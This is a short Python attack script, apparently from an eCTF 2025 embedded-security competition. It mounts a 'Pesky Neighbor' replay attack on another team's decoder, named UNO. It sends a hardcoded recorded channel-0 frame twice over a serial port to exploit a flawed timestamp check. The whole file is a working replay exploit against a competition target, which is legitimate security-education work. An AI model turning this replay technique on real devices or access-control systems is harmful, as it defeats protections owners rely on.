"""Pesky Neighbor attack for UNO
@author: Gavin Zhong, Liz Grzyb
@description: UNO wrongly implementing the security checks of increment of timestamp, by replaying a recorded frame from ch0, 
we make the decoder in violation of security requirement 3
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Gavin Zhong
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b"\x00\x00\x00\x008G$f\xac.\x06\x00\xf5Q\xce\xf4\x1b}\xac\xf1\xbb\xa3p\xadK\x15,\xe9\\\xe9[1\x95\xe1D\x04\x0cb&\x9d(\x8c`\xec\xac\xb8R\xcf\xbd\xa6\x81\x97d#7\x900\xd5\t\xfa\xdf\x18\xa1\xde\xcc\xe7\x92\xed\xcf1\x07u\x00u\x91A\xf4u\x16\xf6\x86Ed\x17\xca\x97m\x9e\xdf0\xa3/\xe0\x7f'\x9aj4\xe0K'\xad\x94\xe2\xfas\xec\x13f\xe4i\x16\xd3\xf9\xec\x0e\x1b\xa7\x0c\xdc"
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
